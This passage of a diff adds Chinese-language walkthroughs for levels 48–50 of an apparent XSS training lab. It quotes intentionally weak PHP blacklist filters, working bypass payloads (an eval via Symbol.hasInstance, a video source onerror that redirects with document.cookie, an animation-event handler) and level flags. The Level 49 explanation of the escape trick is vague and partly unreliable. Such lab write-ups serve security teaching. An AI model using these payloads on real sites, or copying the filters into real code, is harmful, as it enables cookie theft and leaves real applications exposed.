+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed)\b/i', '<blocked', $safe);
+    $safe = preg_replace('/hasInstance/i', 'blockedInstance', $safe);
+    $safe = preg_replace('/\b(onerror|throw|Function|constructor)\b/i', 'blocked', $safe);
+```
+- 语法归一化（仅修正解析，不改变语义）：[level48/index.php](file:///d:/Book/XSS-Sec/level48/index.php#L22-L24)
+```php
+$safe = preg_replace("/'([^'\\\\]|\\\\.)*'\\s*instanceof\\s*\\{/i", "$0", $safe);
+$safe = preg_replace("/'([^']*)'\\s*instanceof\\s*\\{/", "'$1' instanceof ({", $safe);
+$safe = preg_replace("/\\}\\s*<\\s*\\/\\s*script\\s*>/i", "})</script>", $safe);
+```
+说明：
+- 使用 `rawurldecode` 双解码避免 `+` 被第二次解码为空格，保证组合字符串 `'has'+'Instance'` 不被破坏。
+- 黑名单移除了字面量括号 `()` 与常规危险向量，使常规函数调用失效；但字符串内的 `\x28`、`\x29` 会在运行时被 JS 解析为括号，从而还原 `alert(document.cookie)`。
+- 服务端不允许直接出现 `hasInstance` 字面量，但通过 `'has'+'Instance'` 组合可绕过该规则，仍能计算得到 `Symbol.hasInstance`。
+- 语法归一化是最小修复：将 `'...'\s*instanceof{...}` 规范为 `'...' instanceof ({...})`，避免词法/语法冲突，不改变 payload 的核心语义。
+
+**通关思路：**
+- 构造如下 payload，使 `instanceof` 调用右侧对象的 `@@hasInstance`：
+```html
+<script>'alert\x28document.cookie\x29'instanceof{[Symbol['has'+'Instance']]:eval}</script>
+```
+- 执行机理：
+  - 字符串中的 `\x28`、`\x29` 在 JS 运行时被还原为 `(`、`)`，得到 `'alert(document.cookie)'`。
+  - `[Symbol['has'+'Instance']]` 计算得到 `Symbol.hasInstance`，绕过黑名单对 `hasInstance` 字面量的拦截。
+  - `instanceof` 触发 RHS 对象的 `@@hasInstance`，此处方法绑定为 `eval`，相当于 `eval('alert(document.cookie)')` 在主文档上下文执行。
+
+**Payload：**
+```html
+<script>'alert\x28document.cookie\x29'instanceof{[Symbol['has'+'Instance']]:eval}</script>
+```
+
+**执行流程：**
+1. 服务端对输入进行双次 `rawurldecode`，保留 `+` 字符，随后黑名单清洗移除括号与常规向量。
+2. 归一化 `instanceof` 语法为 `'...' instanceof ({...})`，避免解析错误。
+3. 浏览器执行脚本：`instanceof` 调用对象的 `@@hasInstance`（即 `eval`），执行字符串还原出的 `alert(document.cookie)`。
+4. 成功弹出 Cookie，验证漏洞。
+
+**Flag：**
+```
+flag{b7f3f9f2-1f1a-4e9a-9b2a-8c6c1e6a48d2}
+```
+
+## Level 49: Video Source onerror XSS（强黑名单）
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level49/index.php](file:///d:/Book/XSS-Sec/level49/index.php#L1-L4)
+```php
+$flag = 'flag{f1cb6d4b-7f1a-4c6b-b1a4-4a9b3b2c7e91}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与最多两次 URL 解码（保留 `+` 与反斜杠序列）：[level49/index.php](file:///d:/Book/XSS-Sec/level49/index.php#L7-L11)
+```php
+for ($i = 0; $i < 2; $i++) {
+    $dec = rawurldecode($render);
+    if ($dec === $render) break;
+    $render = $dec;
+}
+```
+- 强黑名单清洗（只保留 `<source ...>` 原样）：[level49/index.php](file:///d:/Book/XSS-Sec/level49/index.php#L12-L26)
+```php
+$safe = $render;
+if ($safe !== '') {
+    $sources = [];
+    $i = 0;
+    if (preg_match_all('/<\s*source\b[^>]*>/i', $safe, $ms)) {
+        foreach ($ms[0] as $block) {
+            $token = "%%SOURCE_BLOCK_" . $i . "%%";
+            $sources[$token] = $block;
+            $safe = str_replace($block, $token, $safe);
+            $i++;
+        }
+    }
+    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
+    $safe = preg_replace('/\b(onload|onclick|onmouseover|onfocus|onanimationend|onerror)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
+    foreach ($sources as $token => $block) {
+        $safe = str_replace($token, $block, $safe);
+    }
+}
+```
+说明：
+- 先将所有 `<source ...>` 片段替换为占位符，随后对其它标签与事件属性进行黑名单清洗；完成后再恢复 `<source ...>` 原样。这样可以在全局移除 onerror 的同时，确保 `<source onerror=...>` 不被清洗。
+- 清洗策略阻断常见的 `<img onerror>` 与 `<svg onload>` 等路径，只允许 `<video><source>` 组合成为唯一的事件执行入口。
+- 使用 `rawurldecode` 双解码，避免第二次将 `+` 解为空格，保留八进制转义与路径构造的有效性。
+
+**通关思路：**
+- 利用 `<video><source>` 组合的解析与错误事件触发，将执行点放在 `<source onerror=...>`。
+- 构造基于路径与八进制转义的表达式，以绕过关键字拦截并触发浏览器跳转或资源请求：
+```html
+<video><source onerror=location=/\02.rs/+document.cookie>
+```
+**执行机理：**
+- `<source>` 尝试加载资源时发生错误，触发 onerror 事件，执行属性值中的表达式。
+- `location=/\02.rs/+document.cookie` 通过正则字面量与字符串拼接构造路径：
+  - `\0` 序列：在 JS 字符串/正则里，反斜杠后跟数字表示八进制转义（如 `\062` 为字符 `'2'`）。`/\02.rs/` 试图在 URL 路径中混入特殊字符，规避基于字面匹配的过滤。
+  - 使用斜杠与正则字面量可触发浏览器对路径的宽容解析，在某些环境下形成跳转或请求，后缀拼接 `+document.cookie` 以附带 Cookie 信息。
+- 由于全局黑名单阻断了其它事件与标签，此链路成为唯一可行的执行路径。
+
+**Payload：**
+```html
+<video><source onerror=location=/\02.rs/+document.cookie>
+```
+
+**执行流程：**
+1. 服务端将 `<source ...>` 片段占位，黑名单清理其它标签与事件属性，移除 `<script>` 与 `javascript:` 等。
+2. 恢复 `<source ...>` 原样，将其嵌入 `<video>` 中，由于资源错误触发 onerror。
+3. onerror 表达式在主文档上下文运行，构造路径并附加 `document.cookie`，形成跳转或外部请求。
+4. 该路径通过八进制转义与斜杠解析的宽容性，绕过基于字符串匹配的路径过滤规则。
+
+**Flag：**
+```
+flag{f1cb6d4b-7f1a-4c6b-b1a4-4a9b3b2c7e91}
+```
+
+## Level 50: Bootstrap 实战站点（强黑名单）
+
+**源码分析：**
+- Cookie 设置（关卡标识）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L1-L3)
+```php
+$flag = 'flag{a3c2f6d5-4b1e-43fa-9f6a-2c8c9e1f50ab}';
+setcookie('flag', $flag, time() + 3600, '/', '', false, false);
+```
+- 输入处理与最多两次 URL 解码（保留 + 与反斜杠序列）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L5-L10)
+```php
+$input = isset($_GET['content']) ? $_GET['content'] : '';
+$render = $input;
+for ($i = 0; $i < 2; $i++) {
+    $dec = rawurldecode($render);
+    if ($dec === $render) break;
+    $render = $dec;
+}
+```
+- 允许片段（仅当同时满足 class 与事件表达式才原样输出）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L11-L18)
+```php
+$allowed = '';
+$rest = $render;
+if ($rest !== '') {
+    if (preg_match('/<\s*xss[^>]*\bclass\s*=\s*(?:"progress-bar-animated"|\'progress-bar-animated\'|progress-bar-animated)[^>]*\bonanimationstart\s*=\s*alert\s*\(\s*(?:1|document\s*\.\s*cookie)\s*\)[^>]*>(?:\s*<\/\s*xss\s*>)?/i', $rest, $m)) {
+        $allowed = $m[0];
+        $rest = str_replace($m[0], '', $rest);
+    }
+}
+```
+- 强黑名单清洗（其余全部移除/重写/转义）：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L19-L25)
+```php
+$safe = $rest;
+if ($safe !== '') {
+    $safe = preg_replace('/<\s*script\b[\s\S]*?<\s*\/\s*script\s*>/i', '', $safe);
+    $safe = preg_replace('/\b(onload|onerror|onclick|onmouseover|onfocus|onanimationend|onanimationstart)\s*=\s*(?:"[^"]*"|\'[^\']*\'|[^ >]+)/i', '', $safe);
+    $safe = preg_replace('/\b(href|src)\s*=\s*["\']?\s*javascript\s*:/i', '$1=blocked:', $safe);
+    $safe = preg_replace('/<\s*(iframe|img|svg|object|embed|a)\b/i', '<blocked', $safe);
+    $safe = htmlspecialchars($safe, ENT_QUOTES);
+}
+```
+- 前端引入 Bootstrap，并确保动画存在：[level50/index.php](file:///d:/Book/XSS-Sec/level50/index.php#L33-L38)
+```html
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<style>
+  body { padding-top: 56px; }
+  xss { display: inline-block; }
+  /* Bootstrap 的 progress-bar-animated 会触发动画 */
+</style>
+```
+说明：
+- 服务端采用“白中取黑”的策略：先精确匹配允许片段 `<xss class=progress-bar-animated onanimationstart=alert(1|document.cookie)>` 并原样输出；其余输入统一黑名单清理并转义为纯文本。
+- 事件属性在全局黑名单中默认移除，但允许片段中的 `onanimationstart` 保留，从而形成唯一的执行入口。Bootstrap 的 `.progress-bar-animated` 会为该元素启用 CSS 动画，动画开始即触发 `animationstart`。
+- 使用 `rawurldecode` 双解码，避免 `+` 被误当空格，并保留反斜杠序列，提升兼容性。
+
+**通关思路：**
+- 构造自定义元素 `<xss>`，赋予 Bootstrap 的动画类，并在 `onanimationstart` 中放置执行表达式。
+```html
+<xss class=progress-bar-animated onanimationstart=alert(1)>
+```
+或直接使用 Cookie 变体：
+```html
+<xss class=progress-bar-animated onanimationstart=alert(document.cookie)>
+```
+
+**执行流程：**
+1. 服务端匹配允许片段并原样输出；其它输入被黑名单清理与转义。
+2. 浏览器渲染后，`<xss>` 元素因 `.progress-bar-animated` 启动动画，在动画开始时触发 `animationstart`。
+3. 事件属性代码在主文档上下文执行，完成弹窗或读取 Cookie。
+
+**Flag：**
+```
+flag{a3c2f6d5-4b1e-43fa-9f6a-2c8c9e1f50ab}
+```
